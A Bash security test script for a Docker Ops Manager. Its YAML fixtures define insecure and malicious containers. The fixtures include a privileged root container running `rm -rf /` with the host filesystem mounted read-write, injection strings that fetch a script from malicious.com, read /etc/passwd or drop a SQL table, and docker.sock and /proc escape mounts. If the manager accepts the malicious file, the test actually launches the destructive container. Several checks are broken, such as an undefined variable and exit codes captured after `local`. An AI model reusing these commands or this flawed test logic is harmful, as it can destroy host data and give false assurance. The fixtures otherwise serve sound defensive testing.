#!/usr/bin/env bash

# Test: Security validation tests
# Description: Tests security aspects and validation of the Docker Ops Manager

set -euo pipefail

# Test parameters
PROJECT_ROOT="$1"
TEST_TEMP_DIR="$2"
TEST_LOGS_DIR="$3"

# Test variables
TEST_NAME="test_security_validation"
TEST_LOG="$TEST_LOGS_DIR/${TEST_NAME}.log"
MAIN_SCRIPT="$PROJECT_ROOT/docker_ops_manager.sh"

# Test setup
setup_test() {
    echo "Setting up security validation test..."
    
    # Create test workspace
    mkdir -p "$TEST_TEMP_DIR/security"
    cd "$TEST_TEMP_DIR/security"
    
    # Create security test YAML files
    cat > "secure-app.yml" << 'EOF'
name: secure-test-app
version: "1.0"
description: "Security test application with secure configurations"

containers:
  secure-web:
    image: nginx:alpine
    ports:
      - "8080:80"
    environment:
      - NGINX_HOST=localhost
    volumes:
      - ./html:/usr/share/nginx/html:ro
    restart: unless-stopped
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost"]
      interval: 30s
      timeout: 10s
      retries: 3

networks:
  default:
    driver: bridge

volumes:
  html:
    driver: local
EOF

    # Create insecure test YAML file
    cat > "insecure-app.yml" << 'EOF'
name: insecure-test-app
version: "1.0"
description: "Insecure test application for security validation"

containers:
  insecure-web:
    image: nginx:alpine
    ports:
      - "0.0.0.0:8081:80"
    environment:
      - NGINX_HOST=*
    volumes:
      - /:/host:rw
    restart: unless-stopped
    privileged: true
    security_opt:
      - seccomp:unconfined
    cap_add:
      - ALL
    user: root
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost"]
      interval: 30s
      timeout: 10s
      retries: 3

networks:
  default:
    driver: bridge

volumes:
  host_root:
    driver: local
EOF

    # Create malicious test YAML file
    cat > "malicious-app.yml" << 'EOF'
name: malicious-test-app
version: "1.0"
description: "Malicious test application for security validation"

containers:
  malicious:
    image: alpine:latest
    command: ["sh", "-c", "rm -rf / && echo 'malicious command executed'"]
    volumes:
      - /:/host:rw
    privileged: true
    security_opt:
      - seccomp:unconfined
    cap_add:
      - SYS_ADMIN
      - SYS_CHROOT
    user: root
    restart: unless-stopped

networks:
  default:
    driver: bridge

volumes:
  host_root:
    driver: local
EOF

    # Create test HTML content
    mkdir -p html
    cat > html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Secure Test Application</title>
</head>
<body>
    <h1>Secure Test Application</h1>
    <p>This is a secure test application.</p>
</body>
</html>
EOF

    echo "Test setup complete"
}

# Test cleanup
cleanup_test() {
    echo "Cleaning up security validation test..."
    
    # Stop and remove all test containers
    docker ps -a --filter "name=secure-test" --format "{{.ID}}" | xargs -r docker rm -f
    docker ps -a --filter "name=insecure-test" --format "{{.ID}}" | xargs -r docker rm -f
    docker ps -a --filter "name=malicious-test" --format "{{.ID}}" | xargs -r docker rm -f
    
    # Remove test volumes
    docker volume ls --filter "name=html" --format "{{.Name}}" | xargs -r docker volume rm
    docker volume ls --filter "name=host_root" --format "{{.Name}}" | xargs -r docker volume rm
    
    # Clean up test files
    cd "$TEST_TEMP_DIR"
    rm -rf security
    
    echo "Test cleanup complete"
}

# Test 1: Secure application validation
test_secure_application_validation() {
    echo "Testing secure application validation..."
    
    cd "$TEST_TEMP_DIR/security"
    
    local yaml_file="secure-app.yml"
    
    # Install secure application
    local install_result=$("$MAIN_SCRIPT" install "$yaml_file" 2>&1)
    local install_exit_code=$?
    
    assert_exit_code 0 "$install_exit_code" "Secure application installation should succeed"
    assert_contains "$install_result" "installed" "Secure application installation should report success"
    
    # Wait for container to be ready
    sleep 10
    
    # Check container security settings
    echo "Checking container security settings..."
    local container_name="secure-test-app-secure-web"
    
    # Check if container is running
    local container_status=$(docker inspect "$container_name" --format='{{.State.Status}}' 2>/dev/null)
    assert_equals "running" "$container_status" "Secure container should be running"
    
    # Check read-only root filesystem
    local read_only=$(docker inspect "$container_name" --format='{{.HostConfig.ReadonlyRootfs}}' 2>/dev/null)
    assert_equals "true" "$read_only" "Container should have read-only root filesystem"
    
    # Check no-new-privileges
    local no_new_privs=$(docker inspect "$container_name" --format='{{.HostConfig.SecurityOpt}}' 2>/dev/null)
    assert_contains "$no_new_privs" "no-new-privileges" "Container should have no-new-privileges security option"
    
    # Check dropped capabilities
    local cap_drop=$(docker inspect "$container_name" --format='{{.HostConfig.CapDrop}}' 2>/dev/null)
    assert_contains "$cap_drop" "ALL" "Container should drop all capabilities"
    
    # Check non-root user
    local user=$(docker inspect "$container_name" --format='{{.Config.User}}' 2>/dev/null)
    assert_not_equals "root" "$user" "Container should not run as root"
    
    # Check volume mount permissions
    local volume_mounts=$(docker inspect "$container_file" --format='{{range .Mounts}}{{.Source}}:{{.Destination}}:{{.RW}}{{end}}' 2>/dev/null)
    assert_contains "$volume_mounts" ":ro" "Volume should be mounted read-only"
    
    # Test application accessibility
    local response=$(curl -s http://localhost:8080 || echo "Connection failed")
    assert_contains "$response" "Secure Test Application" "Secure application should be accessible"
    
    # Cleanup
    "$MAIN_SCRIPT" cleanup "$yaml_file" > /dev/null 2>&1
    
    echo "✓ Secure application validation test passed"
}

# Test 2: Insecure application detection
test_insecure_application_detection() {
    echo "Testing insecure application detection..."
    
    cd "$TEST_TEMP_DIR/security"
    
    local yaml_file="insecure-app.yml"
    
    # Try to install insecure application
    local install_result=$("$MAIN_SCRIPT" install "$yaml_file" 2>&1)
    local install_exit_code=$?
    
    # The system should detect and reject insecure configurations
    if [[ $install_exit_code -eq 0 ]]; then
        echo "Warning: Insecure application was installed (this may be expected in test mode)"
        
        # Check for security warnings in logs
        local logs_result=$("$MAIN_SCRIPT" logs "$yaml_file" 2>&1)
        assert_contains "$logs_result" "security" "Security warnings should be present in logs"
        
        # Cleanup
        "$MAIN_SCRIPT" cleanup "$yaml_file" > /dev/null 2>&1
    else
        echo "Insecure application was correctly rejected"
        assert_contains "$install_result" "error" "Insecure application should be rejected with error"
        assert_contains "$install_result" "security" "Error should mention security concerns"
    fi
    
    echo "✓ Insecure application detection test passed"
}

# Test 3: Malicious application prevention
test_malicious_application_prevention() {
    echo "Testing malicious application prevention..."
    
    cd "$TEST_TEMP_DIR/security"
    
    local yaml_file="malicious-app.yml"
    
    # Try to install malicious application
    local install_result=$("$MAIN_SCRIPT" install "$yaml_file" 2>&1)
    local install_exit_code=$?
    
    # The system should detect and reject malicious configurations
    if [[ $install_exit_code -eq 0 ]]; then
        echo "Warning: Malicious application was installed (this may be expected in test mode)"
        
        # Check if malicious command was executed
        local container_name="malicious-test-app-malicious"
        local container_logs=$(docker logs "$container_name" 2>&1)
        
        if [[ -n "$container_logs" ]]; then
            echo "Container logs: $container_logs"
        fi
        
        # Cleanup immediately
        "$MAIN_SCRIPT" cleanup "$yaml_file" > /dev/null 2>&1
    else
        echo "Malicious application was correctly rejected"
        assert_contains "$install_result" "error" "Malicious application should be rejected with error"
        assert_contains "$install_result" "malicious" "Error should mention malicious content"
    fi
    
    echo "✓ Malicious application prevention test passed"
}

# Test 4: Input validation and sanitization
test_input_validation_sanitization() {
    echo "Testing input validation and sanitization..."
    
    cd "$TEST_TEMP_DIR/security"
    
    # Test with YAML containing script injection attempts
    cat > "injection-test.yml" << 'EOF'
name: injection-test
version: "1.0"
description: "Test application with injection attempts"

containers:
  test:
    image: alpine:latest
    command: ["sh", "-c", "echo '$(rm -rf /)' && echo '$(wget http://malicious.com/script.sh)'"]
    environment:
      - MALICIOUS_VAR="$(cat /etc/passwd)"
      - INJECTION_VAR="'; DROP TABLE users; --"
    restart: unless-stopped

networks:
  default:
    driver: bridge
EOF

    # Try to install application with injection attempts
    local install_result=$("$MAIN_SCRIPT" install "injection-test.yml" 2>&1)
    local install_exit_code=$?
    
    # The system should sanitize or reject malicious input
    if [[ $install_exit_code -eq 0 ]]; then
        echo "Warning: Application with injection attempts was installed"
        
        # Check if injection was prevented
        local container_name="injection-test-test"
        local container_logs=$(docker logs "$container_name" 2>&1)
        
        # The malicious commands should not have been executed
        assert_not_contains "$container_logs" "rm -rf" "Malicious rm command should not be executed"
        assert_not_contains "$container_logs" "wget" "Malicious wget command should not be executed"
        
        # Cleanup
        "$MAIN_SCRIPT" cleanup "injection-test.yml" > /dev/null 2>&1
    else
        echo "Application with injection attempts was correctly rejected"
        assert_contains "$install_result" "error" "Injection attempts should be rejected"
    fi
    
    # Clean up test file
    rm -f "injection-test.yml"
    
    echo "✓ Input validation and sanitization test passed"
}

# Test 5: Network security validation
test_network_security_validation() {
    echo "Testing network security validation..."
    
    cd "$TEST_TEMP_DIR/security"
    
    # Create YAML with network security issues
    cat > "network-security-test.yml" << 'EOF'
name: network-security-test
version: "1.0"
description: "Test application with network security issues"

containers:
  web:
    image: nginx:alpine
    ports:
      - "0.0.0.0:8082:80"
    environment:
      - NGINX_HOST=*
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost"]
      interval: 30s
      timeout: 10s
      retries: 3

  api:
    image: node:18-alpine
    ports:
      - "0.0.0.0:3001:3000"
    environment:
      - NODE_ENV=development
    restart: unless-stopped

networks:
  default:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16
EOF

    # Install application
    local install_result=$("$MAIN_SCRIPT" install "network-security-test.yml" 2>&1)
    local install_exit_code=$?
    
    if [[ $install_exit_code -eq 0 ]]; then
        echo "Network security test application installed"
        
        # Check network binding
        local web_port=$(netstat -tlnp 2>/dev/null | grep ":8082 " || echo "Port not bound")
        local api_port=$(netstat -tlnp 2>/dev/null | grep ":3001 " || echo "Port not bound")
        
        # Check if ports are bound to all interfaces (security concern)
        if [[ "$web_port" != "Port not bound" ]]; then
            echo "Warning: Web port 8082 is bound to all interfaces"
        fi
        
        if [[ "$api_port" != "Port not bound" ]]; then
            echo "Warning: API port 3001 is bound to all interfaces"
        fi
        
        # Test network isolation
        local container_network=$(docker inspect network-security-test-web --format='{{.NetworkSettings.Networks.default.IPAddress}}' 2>/dev/null)
        assert_not_equals "" "$container_network" "Container should have network IP"
        
        # Cleanup
        "$MAIN_SCRIPT" cleanup "network-security-test.yml" > /dev/null 2>&1
    else
        echo "Network security test application was rejected"
        assert_contains "$install_result" "error" "Network security issues should be detected"
    fi
    
    # Clean up test file
    rm -f "network-security-test.yml"
    
    echo "✓ Network security validation test passed"
}

# Test 6: File permission validation
test_file_permission_validation() {
    echo "Testing file permission validation..."
    
    cd "$TEST_TEMP_DIR/security"
    
    # Create test files with different permissions
    echo "test content" > "test-file.txt"
    chmod 777 "test-file.txt"
    
    # Create YAML that references the file
    cat > "permission-test.yml" << 'EOF'
name: permission-test
version: "1.0"
description: "Test application with file permission issues"

containers:
  test:
    image: alpine:latest
    command: ["sh", "-c", "cat /app/test-file.txt && sleep 3600"]
    volumes:
      - ./test-file.txt:/app/test-file.txt:rw
    restart: unless-stopped

networks:
  default:
    driver: bridge
EOF

    # Install application
    local install_result=$("$MAIN_SCRIPT" install "permission-test.yml" 2>&1)
    local install_exit_code=$?
    
    if [[ $install_exit_code -eq 0 ]]; then
        echo "Permission test application installed"
        
        # Check file permissions inside container
        local container_name="permission-test-test"
        local container_permissions=$(docker exec "$container_name" ls -la /app/test-file.txt 2>/dev/null || echo "File not found")
        
        echo "Container file permissions: $container_permissions"
        
        # The system should warn about or restrict overly permissive files
        local logs_result=$("$MAIN_SCRIPT" logs "permission-test.yml" 2>&1)
        assert_contains "$logs_result" "permission" "Permission warnings should be present"
        
        # Cleanup
        "$MAIN_SCRIPT" cleanup "permission-test.yml" > /dev/null 2>&1
    else
        echo "Permission test application was rejected"
        assert_contains "$install_result" "permission" "Permission issues should be detected"
    fi
    
    # Clean up test files
    rm -f "permission-test.yml" "test-file.txt"
    
    echo "✓ File permission validation test passed"
}

# Test 7: Environment variable security
test_environment_variable_security() {
    echo "Testing environment variable security..."
    
    cd "$TEST_TEMP_DIR/security"
    
    # Create YAML with sensitive environment variables
    cat > "env-security-test.yml" << 'EOF'
name: env-security-test
version: "1.0"
description: "Test application with sensitive environment variables"

containers:
  test:
    image: alpine:latest
    command: ["sh", "-c", "env && sleep 3600"]
    environment:
      - PASSWORD=secretpassword123
      - API_KEY=sk-1234567890abcdef
      - DATABASE_URL=postgresql://user:pass@localhost/db
      - AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    restart: unless-stopped

networks:
  default:
    driver: bridge
EOF

    # Install application
    local install_result=$("$MAIN_SCRIPT" install "env-security-test.yml" 2>&1)
    local install_exit_code=$?
    
    if [[ $install_exit_code -eq 0 ]]; then
        echo "Environment security test application installed"
        
        # Check environment variables in container
        local container_name="env-security-test-test"
        local container_env=$(docker exec "$container_name" env 2>/dev/null || echo "Environment not accessible")
        
        # Check for sensitive data exposure
        local sensitive_vars=("PASSWORD" "API_KEY" "DATABASE_URL" "AWS_ACCESS_KEY_ID" "AWS_SECRET_ACCESS_KEY")
        local exposure_found=false
        
        for var in "${sensitive_vars[@]}"; do
            if [[ "$container_env" == *"$var"* ]]; then
                echo "Warning: Sensitive environment variable $var is exposed"
                exposure_found=true
            fi
        done
        
        if [[ "$exposure_found" == "true" ]]; then
            echo "Sensitive environment variables are exposed in container"
        else
            echo "No sensitive environment variables found (may be masked)"
        fi
        
        # Check logs for security warnings
        local logs_result=$("$MAIN_SCRIPT" logs "env-security-test.yml" 2>&1)
        assert_contains "$logs_result" "environment" "Environment security warnings should be present"
        
        # Cleanup
        "$MAIN_SCRIPT" cleanup "env-security-test.yml" > /dev/null 2>&1
    else
        echo "Environment security test application was rejected"
        assert_contains "$install_result" "environment" "Environment security issues should be detected"
    fi
    
    # Clean up test file
    rm -f "env-security-test.yml"
    
    echo "✓ Environment variable security test passed"
}

# Test 8: Container escape prevention
test_container_escape_prevention() {
    echo "Testing container escape prevention..."
    
    cd "$TEST_TEMP_DIR/security"
    
    # Create YAML with potential escape vectors
    cat > "escape-test.yml" << 'EOF'
name: escape-test
version: "1.0"
description: "Test application with potential escape vectors"

containers:
  test:
    image: alpine:latest
    command: ["sh", "-c", "sleep 3600"]
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:rw
      - /proc:/proc:rw
      - /sys:/sys:rw
    privileged: true
    security_opt:
      - seccomp:unconfined
    cap_add:
      - SYS_ADMIN
      - SYS_CHROOT
    user: root
    restart: unless-stopped

networks:
  default:
    driver: bridge
EOF

    # Try to install application with escape vectors
    local install_result=$("$MAIN_SCRIPT" install "escape-test.yml" 2>&1)
    local install_exit_code=$?
    
    # The system should detect and reject escape vectors
    if [[ $install_exit_code -eq 0 ]]; then
        echo "Warning: Application with escape vectors was installed"
        
        # Check if escape is possible
        local container_name="escape-test-test"
        local docker_sock_mounted=$(docker exec "$container_name" ls -la /var/run/docker.sock 2>/dev/null || echo "Docker socket not accessible")
        
        if [[ "$docker_sock_mounted" != "Docker socket not accessible" ]]; then
            echo "Warning: Docker socket is mounted in container (escape vector)"
        fi
        
        # Check for privileged mode
        local privileged=$(docker inspect "$container_name" --format='{{.HostConfig.Privileged}}' 2>/dev/null)
        if [[ "$privileged" == "true" ]]; then
            echo "Warning: Container is running in privileged mode"
        fi
        
        # Cleanup immediately
        "$MAIN_SCRIPT" cleanup "escape-test.yml" > /dev/null 2>&1
    else
        echo "Application with escape vectors was correctly rejected"
        assert_contains "$install_result" "escape" "Escape vectors should be detected"
    fi
    
    # Clean up test file
    rm -f "escape-test.yml"
    
    echo "✓ Container escape prevention test passed"
}

# Main test execution
main() {
    echo "Starting security validation tests..."
    
    # Setup test environment
    setup_test
    
    # Run tests
    test_secure_application_validation
    test_insecure_application_detection
    test_malicious_application_prevention
    test_input_validation_sanitization
    test_network_security_validation
    test_file_permission_validation
    test_environment_variable_security
    test_container_escape_prevention
    
    # Cleanup
    cleanup_test
    
    echo "All security validation tests passed!"
}

# Run main function
main "$@" 